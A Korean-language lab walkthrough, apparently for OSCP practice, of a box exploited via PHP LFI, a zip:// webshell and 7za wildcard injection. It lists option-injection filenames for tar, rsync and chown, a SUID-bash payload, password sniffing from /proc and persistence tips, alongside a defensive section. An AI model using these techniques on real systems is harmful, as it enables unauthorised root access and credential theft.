| `> /opt/backups/backup.log` | 표준출력을 로그로. **www-data가 이 로그를 읽을 수 있다** ← 유출 채널 |

> [!danger] 세 조건이 동시에 성립할 때만 와일드카드 인젝션이 성립한다
> 1. **높은 권한**으로 실행된다 (root 크론 / `sudo`)
> 2. 명령에 **글로브(`*`)** 가 있다
> 3. 그 글로브가 가리키는 디렉터리에 **내가 파일을 만들 수 있다**
>
> 이 박스는 셋 다 만족한다. **`sudo -l`이나 크론에서 `*`를 보면 즉시 이 셋을 점검하라.**

### 4-3. 배경 지식 — 왜 "파일명"이 공격 벡터가 되는가

핵심은 **글로브를 확장하는 주체가 셸이지 프로그램이 아니라는 것**이다.

```
셸이 보는 것:   7za a backup.zip -pPASS -tzip *.zip
              ↓ 셸이 디렉터리를 읽어 *.zip 을 매칭되는 파일명들로 치환
7za가 받는 것:  argv = ["a","backup.zip","-pPASS","-tzip","@enox.zip","enox.zip","upload_1628773085.zip", ...]
                                                          └─ 이건 "파일명"이 아니라 "인자"다
```

셸은 치환만 하고 **인용부호를 붙여주지 않는다.** `7za`는 `argv`를 받아 **앞에서부터 파싱**하는데, 이때 파일명인지 옵션인지는 **문자열 모양으로만 판단**한다. `-`나 `@`로 시작하면 옵션/지시자다.

> [!note] 그러므로 **파일명 = 내가 쓰는 argv 원소**다
> `touch -- '-rf'` 처럼 대시로 시작하는 파일을 만들면, 그 디렉터리에서 `*`를 쓰는 모든 명령에 `-rf`가 주입된다.
> `--`(옵션 종료 표시)나 `./*`(모든 인자를 `./`로 시작시킴)를 쓰면 막을 수 있는데, **스크립트 작성자들이 거의 하지 않는다.**

**도구별 대표 벡터 — 이 표가 시험 자산이다:**

| 도구 | 만들 파일명 | 효과 |
|---|---|---|
| **`7z` / `7za` / `7zr`** | `@파일명` | 그 파일을 **리스트파일**로 읽는다. 심볼릭 링크와 결합하면 **임의 파일 읽기(에러 메시지로 유출)** ← 이 박스 |
| | `-i@파일` / `-x@파일` | include/exclude 리스트파일 지정. 동일 원리 |
| **`tar`** (GNU) | `--checkpoint=1` <br> `--checkpoint-action=exec=sh x.sh` | 아카이빙 중 **임의 명령 실행 → 즉시 RCE** |
| | `--to-command=sh x.sh` | 추출 시 명령 실행 |
| **`rsync`** | `-e sh x.sh` | 원격 셸을 지정하는 옵션으로 **명령 실행** |
| **`chown` / `chmod`** | `--reference=파일` | 소유자/권한을 **참조 파일에서 복사**. `/etc/shadow` 같은 걸 참조시켜 소유권 탈취 |
| **`zip`** | `-T -TT 'sh x.sh'` | 무결성 테스트 명령으로 실행 |
| **`cp` / `mv`** | `-t 디렉터리` 등 | 대상 디렉터리 변경 |

> [!tip] `tar` 버전 — 시험에서 가장 자주 나오는 형태
> ```bash
> echo 'chmod +s /bin/bash' > /tmp/x.sh
> touch -- '--checkpoint=1'
> touch -- '--checkpoint-action=exec=sh /tmp/x.sh'
> # root가 tar czf backup.tar.gz * 를 돌리는 순간 실행
> ```
> `touch --` 의 `--`는 **touch 자신이** 그 뒤를 옵션으로 보지 않게 하는 것이다. 빼면 `touch: unrecognized option` 이 난다.
> [[Cockpit]]의 `sudo tar -czvf /tmp/backup.tar.gz *` 가 정확히 이 형태다.

이 박스에서 참조한 원 자료:

![[Pasted image 20260714122358.png]]

### 4-4. `7za`의 `@리스트파일` — 이 박스의 정확한 메커니즘

`7z` 계열은 **`@`로 시작하는 인자를 "파일 목록이 담긴 파일"** 로 해석한다:

```bash
7za a out.zip @filelist.txt      # filelist.txt 안에 적힌 파일들을 압축
```

따라서 `*.zip`이 확장될 때 **`@enox.zip`이라는 이름의 파일**이 끼어 있으면:

1. `7za`가 인자 `@enox.zip`을 본다
2. `@` 뒤의 **`enox.zip`을 리스트파일로 열어 읽는다**
3. 읽은 내용의 각 줄을 **압축할 파일 이름**으로 취급한다
4. 그런 파일이 없으면 **`<그 내용> : No more files`** 경고를 출력한다
5. 그 출력이 `> /opt/backups/backup.log` 로 **www-data가 읽을 수 있는 파일에 기록**된다

여기에 **심볼릭 링크**를 걸면 완성된다.

```
enox.zip  ──심볼릭 링크──▶  /root/secret        (root만 읽을 수 있음)
@enox.zip ──7za가 리스트파일로 지목──┘
```

> [!danger] 발상의 핵심 — **내가 읽는 게 아니라, root에게 읽히게 만든다**
> `/root/secret`은 www-data가 **직접 못 읽는다**(root 소유).
> 그런데 **root 크론이 `7za`를 root로 실행**하므로, `7za`가 root 권한으로 `/root/secret`을 열어 그 내용을 "파일 이름"으로 해석하고, **없는 파일이라며 그 이름을 그대로 에러 메시지에 출력**한다.
> 즉 **권한 경계를 넘어 내용을 옮기는 심부름꾼으로 root 프로세스를 쓴 것**이다.
> 이 패턴("고권한 프로세스에게 대신 읽게 하기")은 로그·에러 메시지·백업 산출물이 저권한에게 읽히는 모든 곳에서 재사용된다.

### 4-5. 파일 배치

```bash
www-data@zipper:/var/www/html/uploads$ touch @enox.zip
touch @enox.zip
www-data@zipper:/var/www/html/uploads$ ls -al
ls -al
total 20
drwxr-xr-x 2 www-data www-data 4096 Jul 14 03:11 .
drwxr-xr-x 3 www-data www-data 4096 Aug 12  2021 ..
-rw-r--r-- 1 www-data www-data   32 Aug 12  2021 .htaccess
-rw-r--r-- 1 www-data www-data    0 Jul 14 03:12 @enox.zip
lrwxrwxrwx 1 www-data www-data   12 Aug 12  2021 enox.zip -> /root/secret
-rw-r--r-- 1 www-data www-data  156 Aug 12  2021 upload_1628773085.zip
-rw-r--r-- 1 www-data www-data  144 Jul 14 01:09 upload_1783991346.zip
```

![[Pasted image 20260714121500.png]]

> [!warning] **심볼릭 링크는 이미 있었다** — 이걸 못 보면 헤맨다
> `ls -al`이 말해준다: `enox.zip -> /root/secret` 의 날짜가 **`Aug 12 2021`**, 즉 `.htaccess`·`upload_1628773085.zip`과 **같은 박스 제작 시점**이다. 우리가 만든 `@enox.zip`만 `Jul 14 03:12`다.
> **[가정]** 박스 제작자가 힌트로 심어둔 것이다. 그래서 이 박스는 `touch @enox.zip` **한 줄**로 끝났다.
> **실전에서는 링크도 직접 만들어야 한다** — 두 줄이 완전한 형태다:
> ```bash
> ln -s /root/secret enox.zip
> touch @enox.zip
> ```
> 반대로, **`ls -al`을 안 찍고 `ls`만 봤다면** 이 심볼릭 링크의 존재도, 그 대상이 `/root/secret`이라는 것도 몰랐다. **권한상승 단계에서 `ls`는 언제나 `ls -al`이다.**

> [!note] 이름을 왜 `enox.zip`으로 맞춰야 하는가
> 리스트파일 이름은 **글로브 `*.zip`에 매칭되어야** `7za`의 인자로 들어간다. `@secret` 같은 이름은 `*.zip`에 안 걸려서 아무 일도 안 일어난다.
> **글로브 패턴을 먼저 읽고, 거기 매칭되는 이름으로 만들어라.** `*.tmp`가 대상이면 `@x.tmp`, `*`면 아무 이름이나 된다.

### 4-6. 크론 대기 → 비밀번호 회수

크론이 한 번 돌 때까지 기다린다. **원문 기준 1분 안에** 로그가 갱신됐다.

```bash
www-data@zipper:/opt/backups$ cat backup.log
cat backup.log

7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,1 CPU AMD EPYC 7413 24-Core Processor                 (A00F11),ASM,AES-NI)

Open archive: /opt/backups/backup.zip
--
Path = /opt/backups/backup.zip
Type = zip
Physical Size = 892

Scanning the drive:
3 files, 319 bytes (1 KiB)

Updating archive: /opt/backups/backup.zip

Items to compress: 3


Files read from disk: 3
Archive size: 892 bytes (1 KiB)

Scan WARNINGS for files and folders:

WildCardsGoingWild : No more files
```

![[Pasted image 20260714121543.png]]

**마지막 줄이 `/root/secret`의 내용이다.** `WildCardsGoingWild`라는 "파일"을 못 찾았다는 경고가, 곧 그 파일의 **이름 = 비밀번호**를 출력해 준 것이다.

> [!danger] 크론은 **최소 1주기를 기다린다**
> 5초 보고 "안 되네" 하면 안 된다. **[가정]** 원문이 "1분 후" 확인했다고 기록했으므로 주기는 1분으로 판단한다(정확한 crontab 항목 출력은 원문에 없다).
> 기다리는 동안 손을 놀리지 말고 **다른 권한상승 경로를 병행 열거**하라. [[Astronaut]] · [[Exfiltrated]] · [[Muddy]] 와 같은 교훈이다.
> 로그가 안 바뀌면 의심할 것: ① 파일명이 글로브에 매칭되는가 ② 그 디렉터리가 맞는가 ③ 크론이 실제로 도는가(`pspy`로 확인).

> [!tip] **경로 ② — 같은 스크립트에 더 빠른 유출 경로가 있다** `[가정: 미시도]`
> `-p$password` 는 비밀번호를 **명령행 인자로** 넘긴다. 명령행 인자는 `/proc/<pid>/cmdline`을 통해 **같은 호스트의 누구나 읽을 수 있다.**
> ```bash
> while :; do cat /proc/*/cmdline 2>/dev/null | tr '\0' ' ' | grep -a 7za; done
> # 또는
> pspy64            # 프로세스 생성 시점의 전체 명령행을 잡아준다
> ```
> **우열 비교**: 와일드카드 경로는 확실하지만 크론 1주기를 기다려야 하고, `ps` 경로는 즉시지만 **크론 실행 순간을 놓치면 안 되므로 루프를 돌려야** 한다. 실전에서는 **둘을 동시에 걸어두는 것**이 최선이다 — 어느 쪽이 먼저 터져도 이긴다.
> 일반화: **`-p`·`--password`·`-u user:pass` 를 인자로 받는 명령이 스크립트에 있으면 `ps` 유출을 항상 의심하라.**

> [!note] `rm *.tmp` 는 왜 안 쓰는가 `[가정]`
> 같은 스크립트의 첫 글로브지만 실효 벡터가 아니다. `rm`의 위험 옵션(`-r`·`-f`·`--no-preserve-root`)은 **`*.tmp` 패턴에 매칭되는 이름으로 만들 수 없고**, `-i.tmp` 같은 것은 옵션 클러스터 파싱 오류로 `rm`을 멈출 뿐 권한을 주지 않는다.
> **글로브가 있다고 전부 벡터인 것이 아니라, "그 도구에 위험 옵션이 있고 그 옵션 이름이 패턴에 맞을 때"만 성립한다.** 이 판단을 빨리 내려야 시간을 안 태운다.

---

## 5. 플래그

www-data 셸을 잡은 직후 로컬 플래그를 확인했다(값은 원문에 기록되지 않았다).

![[Pasted image 20260714111529.png]]

획득한 비밀번호로 root가 된다.

```bash
www-data@zipper:/var/www/html/uploads$ su -
su -
Password: WildCardsGoingWild
whoami
root
cat /root/proof.txt
f759ae397349838d362d2fc874892c17
```

![[Pasted image 20260714121708.png]]

| | 위치 | 값 |
|---|---|---|
| `local.txt` | 사용자 홈 (스크린샷으로 확인) | 원문에 값 미기록 |
| `proof.txt` | `/root/proof.txt` | `f759ae397349838d362d2fc874892c17` |
| (비밀번호) | `/root/secret` | `WildCardsGoingWild` |

> [!tip] 시험 증거 형식 연습
> ```bash
> whoami; hostname; ip a; cat /root/proof.txt
> ```
> **한 화면에** 담아야 인정된다. `su -` 직후 이 한 줄을 습관적으로 치는 훈련을 여기서 해둔다.
> `su -`의 `-`(=`--login`)는 **root의 환경변수·PATH·홈으로 완전히 전환**한다. 빼면 www-data의 PATH를 그대로 물려받아 엉뚱한 바이너리를 실행할 수 있다.

---

## 6. 막혔던 지점 / 시행착오

### ① 랩 리버트로 업로드가 통째로 사라졌다 — 실제로 겪은 것

작업이 이틀(7/13 → 7/14)에 걸쳤고, 그 사이 **타겟 IP가 `192.168.164.229` → `192.168.103.229`로 바뀌었다.** 아카이브 이름도 `upload_1783926987.zip` → `upload_1783991346.zip`으로 달라졌다.

> [!danger] **웹셸은 리버트되면 증발한다 — 재현 절차를 노트에 남겨라**
> 표준의 "재부팅/리버트 시 재현 필요"가 실제로 발동한 사례다. `zip://` 페이로드에는 **그때그때 달라지는 타임스탬프**가 박혀 있어, 어제 성공한 URL을 오늘 그대로 붙여넣으면 **무조건 실패**한다.
> **대응**: 노트에 URL을 통째로 적지 말고 **"업로드 → 응답에서 zip 이름 확보 → 그 이름으로 `zip://` 조립"** 이라는 *절차*로 적어라. 시험은 리버트가 잦다.
> 부수 교훈: **셸을 잡으면 `.ssh/authorized_keys` 추가나 SUID 백도어 같은 "리버트에 강한" 재진입 경로를 확보**해 두면 재작업 비용이 사라진다(단, 시험에서는 흔적 정리 의무를 함께 고려).

### ② 리버스셸을 두 번 만들었다 — curl 판과 브라우저 판

포트 4444(`curl -G --data-urlencode`)와 4443(브라우저/프록시 GET, 전부 수동 URL 인코딩) 두 버전이 남아 있다.

**[가정]** 첫 시도에서 인코딩 문제로 셸이 안 붙어 방식을 바꿔 재시도한 흔적으로 판단한다. 실패 로그 자체는 원문에 없다.

> [!warning] 어느 쪽이든 실패 원인은 **인코딩 아니면 셸 종류** 둘 중 하나다
> | 증상 | 원인 | 확인법 |
> |---|---|---|
> | 200인데 아무 일도 안 일어남 | `#`가 잘려 zip 엔트리 미지정 | `c=id`로 되돌려 **웹셸 자체가 사는지** 먼저 확인 |
> | `c=id`는 되는데 셸만 안 붙음 | `>&` 가 dash에서 문법오류 | `bash -c '...'` 로 감쌌는지 확인 |
> | 명령이 중간에 끊김 | `&`를 인코딩 안 함 | `%26`으로 바꾸거나 `--data-urlencode`에 위임 |
> | 전부 정상인데 연결이 없음 | 아웃바운드 필터 | 443/80/53으로 포트를 바꿔 재시도 |
>
> **한 번에 한 변수만 바꿔라.** 인코딩과 셸 종류를 동시에 고치면 무엇이 원인이었는지 모른 채 넘어간다.

### ③ 이 유형에서 흔히 막히는 지점

> [!note] 아래는 원문에 실패 기록이 없어, **일반적으로 이 유형에서 시간을 태우는 지점**으로 정리한 것이다 `[가정]`

**(1) `php://filter`로 소스가 안 나온다**
- `resource=upload.php` 처럼 확장자를 붙였다 → 확장자 append형 LFI면 `upload.php.php`를 찾다 실패. **확장자를 빼고** 다시.
- 응답이 base64처럼 안 보인다 → 눈으로 판단하지 말고 `| base64 -d`로 파이프. HTML에 섞여 나오면 `view-source`나 `curl`로 raw를 봐라.
- 그래도 안 되면 **필터를 바꾼다**: `convert.base64-encode` → `string.rot13` → `convert.iconv.utf-8.utf-16`.

**(2) `zip://`가 아무 반응이 없다**
- **`#`를 `%23`으로 안 썼다** — 압도적 1위 원인. 서버 로그/Burp에서 실제로 도착한 쿼리스트링을 확인하면 즉시 보인다.
- 엔트리 이름에 `.php`를 붙였다 → append형이면 `.php.php`가 된다.
- zip 경로가 틀렸다 → 상대경로 기준은 **`index.php`가 있는 디렉터리**다. 헷갈리면 절대경로(`/var/www/html/uploads/...`)로.
- **zip 안의 엔트리 이름을 모른다** → 로컬에서 `unzip -l`로 확인. 이 박스는 내가 업로드한 이름 그대로다.

**(3) 업로드는 되는데 실행이 안 된다**
- `/uploads/`에 `.htaccess`가 있는지 본다. PHP 실행이 꺼져 있으면 **직접 접근은 영영 안 된다.**
- 이때 **포기하지 말고 "그 파일을 include해 줄 지점"을 찾아라.** 업로드와 실행이 분리된 박스의 정답은 항상 LFI/역직렬화 쪽이다.

**(4) 와일드카드 인젝션이 발화하지 않는다**
- 파일명이 **글로브 패턴에 매칭되지 않는다**(`@secret` vs `*.zip`).
- **디렉터리가 다르다** — 스크립트의 `cd` 줄을 다시 읽어라.
- **`--`를 안 붙여 `touch`가 옵션으로 먹었다** → `touch -- '--checkpoint=1'`.
- **크론 1주기를 안 기다렸다.**
- `sudo`로 직접 실행하는 경우라면 **현재 디렉터리가 `sudo` 실행 시점의 cwd**임을 잊지 말 것.

### ④ 시간 배분 — 어디서 손절했어야 하는가

| 구간 | 실제/권장 | 판단 |
|---|---|---|
| feroxbuster 전수 스캔 | **19분** | **길다.** 작은 사전 2분 → 손을 움직이며 큰 사전은 백그라운드. 확장자에 `php`를 반드시 포함 |
| LFI 발견 → 소스 유출 | 짧음 | `?file=` 을 보면 `php://filter`가 **첫 수**여야 한다. 여기서 10분 넘게 헤매면 파라미터 자체를 의심 |
| 업로드 → `zip://` 실행 | 짧음 | 소스를 읽었으면 자명하다. **소스 확보가 시간의 대부분을 절약**했다 |
| privesc 열거 | linpeas | `/etc/crontab` 직접 `cat`이 더 빠르다. **5개 반사 명령이면 3분** |
| 크론 대기 | 1분 | 대기 중 **`ps` 경로를 병행**했으면 무엇이 터지든 이겼다 |

> [!tip] 손절 기준
> **LFI 파라미터를 찾은 뒤 30분 안에 소스가 안 나오면** 래퍼가 막힌 것이다 — 그때는 로그 포이즈닝(`/var/log/apache2/access.log`의 User-Agent에 `<?php ?>` 삽입)이나 `/proc/self/environ`로 방향을 튼다.
> **권한상승 열거를 20분 했는데 아무것도 안 나오면** 크론을 놓쳤을 가능성이 가장 높다. `pspy64`를 올려 2분만 지켜봐라.

---

## 7. OSCP 시험 관점

1. **`?file=`·`?page=`·`?include=`·`?path=` 를 보면 `php://filter`가 첫 수다.** 소스가 나오면 그 안에 다음 단계가 전부 적혀 있다. 블랙박스 추측보다 압도적으로 빠르다.
2. **확장자 append형 LFI를 구분하라.** `/etc/passwd`가 안 나온다고 "LFI가 아니다"로 결론내지 마라. **확장자를 빼고 `.php` 파일을 노려라.**
3. **`allow_url_include=Off`는 `zip://`·`phar://`·`php://filter`를 못 막는다.** "RFI는 막혔다"는 방어자 가정의 빈틈이 정확히 여기다.
4. **`#`는 반드시 `%23`.** 이 한 글자로 몇 시간을 태울 수 있다. `curl`은 `-G --data-urlencode`에 인코딩을 위임하라.
5. **업로드 + LFI = RCE.** 업로드 디렉터리에서 PHP가 안 돌아도 상관없다. **`include`가 실행 엔진**이다. zip/tar를 만드는 업로드는 `zip://`, 아무 파일이나 받으면 zip을 만들어 `.jpg`로 위장해 올린다.
6. **예측 가능한 파일명(`time()`·`date()`)은 그 자체로 취약점이다.** ±5초 브루트가 11번이면 끝난다. 응답이 이름을 알려주면 그것부터 읽어라.
7. **⚠️ 자동 도구 대신 손으로**: 이 박스는 sqlmap·metasploit이 필요 없다. LFI 확인·소스 유출·웹셸 실행 전부 `curl` 한 줄이다. **linPEAS/pspy는 금지 아님**(열거 도구)이지만, 결정적 판단은 `/etc/crontab` 직접 `cat`으로 확인하라.
8. **셸을 잡자마자 5개**: `id` · `sudo -l` · `find / -perm -4000 -type f 2>/dev/null` · `getcap -r / 2>/dev/null` · `cat /etc/crontab; ls -la /etc/cron.*`. 이 박스의 정답은 다섯 번째다.
9. **`sudo -l`이나 크론에서 `*`를 보면 즉시 와일드카드 인젝션을 검토하라.** 조건 3가지: 고권한 실행 · 글로브 · 쓰기 가능한 대상 디렉터리. `7z`→`@리스트파일`, `tar`→`--checkpoint-action`, `rsync`→`-e`, `chown/chmod`→`--reference`.
10. **파일명은 argv다.** 셸이 글로브를 확장하면 그 결과가 **인용 없이 인자 위치**에 들어간다. `touch -- '-옵션'`으로 만든다 — `--`를 빼면 `touch` 자신이 먹는다.
11. **"내가 못 읽는 파일은 root에게 읽히게 한다."** 고권한 프로세스의 **에러 메시지·로그·백업 산출물**이 저권한에게 읽히면 그것이 유출 채널이다. 이 발상은 7z 말고도 계속 재사용된다.
12. **비밀번호를 명령행 인자로 넘기는 스크립트는 `ps`로 샌다.** `/proc/*/cmdline` 루프나 `pspy`로 잡는다. 크론 대기 중에 병행하면 공짜다.
13. **크론 기반은 최소 1주기 대기.** 5초 보고 실패로 결론내지 마라. 반대로 **셸이 늦게 붙거나 뒤늦게 뭔가 바뀌면 크론을 의심**한다. ([[Astronaut]] · [[Exfiltrated]] · [[Muddy]])
14. **`su`는 진짜 TTY를 요구한다.** 비밀번호를 얻고도 못 쓰는 사고가 실제로 흔하다. `python3 -c 'import pty; pty.spawn("/bin/bash")'` → 없으면 `script -qc /bin/bash /dev/null` → `stty raw -echo; fg`.
15. **`ls`가 아니라 `ls -al`.** 이 박스의 결정적 단서(`enox.zip -> /root/secret`)는 `-l` 없이는 보이지 않는다. 심볼릭 링크·숨김 파일·날짜가 전부 여기 있다.
16. **리버트를 전제로 노트를 써라.** 타임스탬프가 박힌 URL은 재사용 불가다. **절차로 적어라.**

---

## 8. 방어 관점

| 결함 | 조치 |
|---|---|
| `include`에 사용자 입력이 직접 들어감 | **화이트리스트 매핑**으로 바꾼다: `$pages = ['home'=>'home.php','upload'=>'upload.php']; include($pages[$_GET['file']] ?? 'home.php');` 경로 문자열을 사용자에게 맡기지 않는다 |
| 스트림 래퍼가 include에 허용됨 | `php.ini`의 `allow_url_include=Off`(기본)에 더해, **`open_basedir`로 접근 가능 경로를 웹루트로 제한**한다. `phar` 역직렬화 대비로 PHP 8.0+ 사용 |
| 업로드 파일 검증 부재 | 확장자 화이트리스트 + MIME + **매직바이트** 검증. 다만 **검증만으로는 래퍼 공격을 못 막는다** — 아래 두 줄이 더 중요하다 |
| **zip 내부 엔트리 이름 = 사용자 입력** | `addFromString($_FILES['img']['name'][$i], ...)` → **서버가 생성한 안전한 이름**을 쓴다. 디스크 사본만 개명하고 아카이브 내부를 방치한 것이 이 박스의 직접 원인 |
| 업로드 파일명이 예측 가능(`time()`) | `bin2hex(random_bytes(16))` 같은 **암호학적 난수**로. 시각 기반은 항상 브루트 가능하다 |
| 업로드 디렉터리가 웹루트 안 | **웹루트 밖**에 저장하고 다운로드는 스크립트를 통해 중계한다. `.htaccess` 한 줄에 의존하지 않는다 |
| **크론 스크립트가 글로브를 그대로 사용** | 대상을 명시적으로 한정한다: `7za a out.zip -tzip -- ./*.zip` 또는 `find . -maxdepth 1 -name '*.zip' -type f -print0 \| xargs -0 7za a out.zip`. **`--`와 `./` 접두사**가 옵션 해석을 차단한다 |
| 크론이 **사용자 쓰기 가능 디렉터리**에서 작업 | 백업은 **읽기 전용 스냅샷**을 별도 경로에 복사한 뒤 처리한다. 신뢰 경계를 넘는 디렉터리에서 root 명령을 돌리지 않는다 |
| 비밀번호를 **명령행 인자**로 전달(`-p$password`) | `7za`의 `-p` 대신 **환경변수·stdin**을 쓰거나 GPG로 대체. 명령행은 `/proc/*/cmdline`으로 전 사용자에게 노출된다 |
| root 크론 출력이 저권한 읽기 가능 로그로 | 로그 경로를 `/root/` 하위로 옮기고 `chmod 600`. **에러 메시지에 특권 데이터가 실릴 수 있다**는 전제로 설계한다 |
| `/root/secret`에 평문 비밀번호 | 백업 암호는 파일이 아니라 시크릿 관리자/키링에서. 애초에 **root 비밀번호와 백업 암호를 같게 쓰지 않는다** |
| 심볼릭 링크가 업로드 디렉터리에 존재 | 업로드 경로에서 심볼릭 링크를 금지하고 주기적으로 `find /var/www -type l`로 점검 |

---

## 9. 참고 자료

- **CVE 없음** — 커스텀 PHP 애플리케이션의 로직 결함이다. OWASP **A03: Injection** / **A01: Broken Access Control**
- PHP 스트림 래퍼 공식 문서: https://www.php.net/manual/en/wrappers.php
- `php://` 래퍼(필터 포함): https://www.php.net/manual/en/wrappers.php.php
- `zip://` 래퍼: https://www.php.net/manual/en/wrappers.compression.php
- 필터 목록(`convert.*`·`string.*`): https://www.php.net/manual/en/filters.php
- PayloadsAllTheThings — File Inclusion: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
- **HackTricks — Wildcards Spare Tricks (7-Zip / tar / rsync / chown)**: https://hacktricks.wiki/en/linux-hardening/privilege-escalation/wildcards-spare-tricks.html#7-zip--7z--7za
- **GTFOBins — `7z`**: https://gtfobins.github.io/gtfobins/7z/
- **GTFOBins — `tar`**: https://gtfobins.github.io/gtfobins/tar/
- **GTFOBins — `rsync`**: https://gtfobins.github.io/gtfobins/rsync/
- `php://filter` 체인 RCE (Charles Fol): https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it
- p7zip 리스트파일(`@`) 문법: `man 7z` 의 *"Command Line Syntax"* — `@listfile`

## 남긴 흔적

| 항목 | 상태 |
|---|---|
| `/var/www/html/uploads/upload_1783926987.zip` (웹셸 포함) | 남아 있음 — 랩 리버트로 소멸 |
| `/var/www/html/uploads/upload_1783991346.zip` (웹셸 포함) | 남아 있음 |
| `/var/www/html/uploads/<날짜><난수>.tmp` 사본 | 크론의 `rm *.tmp`가 매 주기 삭제 |
| `/var/www/html/uploads/@enox.zip` | **남아 있음** — 실제 평가라면 `rm -- '@enox.zip'`로 제거해야 한다 |
| `/opt/backups/backup.log` | 비밀번호가 노출된 상태로 남음 (다음 크론 주기에 덮어써짐) |

획득 자격증명: **root / `WildCardsGoingWild`** (`/root/secret`).

## 관련 노트

- [[_WRITEUP-STANDARD]] — 이 노트의 작성 기준
- [[03. Pentest Advenced]] — Zipper 항목(페이로드 요약)
- [[Cockpit]] — `sudo tar -czvf ... *` 와일드카드 인젝션 (같은 계열, tar 판)
- [[Muddy]] — `php://filter` 언급 + 크론 `PATH` 하이재킹
- [[Astronaut]] · [[Exfiltrated]] — **크론 기반 지연 실행**(최소 1주기 대기) 패턴
- [[Slort]] · [[Clue]] · [[Twiggy]] — LFI 계열 박스
- [[Hawat]] — 소스를 손에 넣고 읽어 취약점을 찾는 흐름(화이트박스 리뷰)
